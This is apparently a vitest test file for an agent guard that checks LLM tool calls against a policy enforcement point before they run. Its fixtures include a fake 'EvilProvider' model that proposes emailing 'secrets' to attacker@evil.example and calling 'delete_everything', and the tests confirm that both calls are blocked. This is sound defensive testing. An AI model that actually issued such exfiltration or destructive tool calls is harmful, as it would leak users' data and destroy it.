import http from "node:http";
import type { AddressInfo } from "node:net";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { LLMPlanner } from "@/server/agent/llm/llm-planner";
import { OllamaProvider, ollamaStatus } from "@/server/agent/llm/ollama";
import { type ChatRequest, type ChatResponse, type LLMProvider, ProviderError } from "@/server/agent/llm/types";
import { runAgent } from "@/server/agent/runtime";
import * as s from "@/server/db/schema";
import { setup } from "../helpers";

let server: http.Server;
let host = "";
let lastBody: Record<string, unknown> | null = null;
let mode: "tool" | "text" | "slow" | "missing" = "tool";

beforeAll(async () => {
  server = http.createServer((req, res) => {
    let raw = "";
    req.on("data", (c) => (raw += c));
    req.on("end", () => {
      if (req.url === "/api/version") return res.end(JSON.stringify({ version: "test" }));
      if (req.url === "/api/tags") return res.end(JSON.stringify({ models: [{ name: "fake:1b", size: 1, digest: "abc", details: { family: "fake" } }] }));
      lastBody = JSON.parse(raw || "{}");
      if (mode === "missing") {
        res.statusCode = 404;
        return res.end(JSON.stringify({ error: "model not found" }));
      }
      if (mode === "slow") return setTimeout(() => res.end("{}"), 2000);
      const message =
        mode === "tool"
          ? { role: "assistant", content: "", tool_calls: [{ function: { name: "send_email", arguments: { to: "x@evil.example", subject: "s", body: "b" } } }] }
          : { role: "assistant", content: "All done." };
      res.end(JSON.stringify({ model: "fake:1b", message, done_reason: "stop", prompt_eval_count: 12, eval_count: 5 }));
    });
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  host = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  process.env.OLLAMA_HOST = host;
  process.env.AGENTGUARD_OLLAMA_MODEL = "fake:1b";
});

afterAll(() => {
  server.close();
  delete process.env.OLLAMA_HOST;
  delete process.env.AGENTGUARD_OLLAMA_MODEL;
});

const req = (timeoutMs = 5000): ChatRequest => ({
  system: "sys",
  messages: [{ role: "user", content: "hi" }],
  tools: [{ name: "send_email", description: "d", parameters: { type: "object" } }],
  timeoutMs,
});

describe("Ollama provider", () => {
  it("sends tools + deterministic sampling and parses tool calls and usage", async () => {
    mode = "tool";
    const r = await new OllamaProvider().chat(req());
    expect(lastBody).toMatchObject({ model: "fake:1b", stream: false, options: { temperature: 0, seed: 42 } });
    expect((lastBody!.tools as unknown[]).length).toBe(1);
    expect(r.toolCalls[0]).toMatchObject({ name: "send_email", arguments: { to: "x@evil.example" } });
    expect(r.usage).toEqual({ inputTokens: 12, outputTokens: 5 });
    expect(r.stopReason).toBe("tool_use");
  });

  it("maps errors: timeout, missing model, unreachable", async () => {
    mode = "slow";
    await expect(new OllamaProvider().chat(req(300))).rejects.toMatchObject({ kind: "timeout" });
    mode = "missing";
    await expect(new OllamaProvider().chat(req())).rejects.toMatchObject({ kind: "model_missing" });
    const saved = process.env.OLLAMA_HOST;
    process.env.OLLAMA_HOST = "http://127.0.0.1:1";
    await expect(new OllamaProvider().chat(req())).rejects.toBeInstanceOf(ProviderError);
    expect((await ollamaStatus()).reachable).toBe(false);
    process.env.OLLAMA_HOST = saved;
  });

  it("status reports reachable server and whether the configured model is present", async () => {
    const st = await ollamaStatus();
    expect(st).toMatchObject({ reachable: true, version: "test", modelPresent: true });
  });
});

/** A fake LLM that always proposes exfiltration — the PEP must still decide. */
class EvilProvider implements LLMProvider {
  readonly id = "ollama" as const;
  readonly config = { model: "evil", maxOutputTokens: 10 };
  private n = 0;
  async chat(): Promise<ChatResponse> {
    this.n += 1;
    const base = { usage: { inputTokens: 1, outputTokens: 1 }, latencyMs: 1, model: "evil" };
    if (this.n === 1)
      return { ...base, text: "", stopReason: "tool_use", toolCalls: [{ id: "c1", name: "send_email", arguments: { to: "attacker@evil.example", subject: "x", body: "secrets" } }, { id: "c2", name: "delete_everything", arguments: {} }] };
    return { ...base, text: "done", stopReason: "end_turn", toolCalls: [] };
  }
}

describe("LLM planner + runtime", () => {
  it("LLM tool calls cannot bypass the PEP (blocked calls never execute)", async () => {
    const ctx = await setup();
    const st = await ctx.start("Summarize doc:public/handbook", { allowedTools: ["read_documents", "send_email"], resourceScope: ["doc:public/*"] });
    const planner = new LLMPlanner(new EvilProvider());
    const run = await runAgent({ pep: ctx.pep, planner, session: st, prompt: "Summarize doc:public/handbook", agentId: ctx.agentId, onReview: "defer" });
    expect(run.steps.map((x) => x.result.decision.decision)).toEqual(["BLOCK", "BLOCK"]);
    expect(run.steps[1].result.decision.reasons[0].code).toBe("UNKNOWN_TOOL");
    expect(await ctx.db.select().from(s.sandboxEffects)).toHaveLength(0);
    expect(planner.turnLog.length).toBe(2);
  });

  it("provider failure ends the run as failed without executing anything", async () => {
    const ctx = await setup();
    const st = await ctx.start("x");
    const broken: LLMProvider = { id: "ollama", config: { model: "m", maxOutputTokens: 1 }, chat: async () => { throw new ProviderError("down", "unavailable"); } };
    const run = await runAgent({ pep: ctx.pep, planner: new LLMPlanner(broken), session: st, prompt: "x", agentId: ctx.agentId, onReview: "defer" });
    expect(run.status).toBe("failed");
    expect(run.finalMessage).toContain("down");
    expect(await ctx.db.select().from(s.toolCalls)).toHaveLength(0);
  });
});
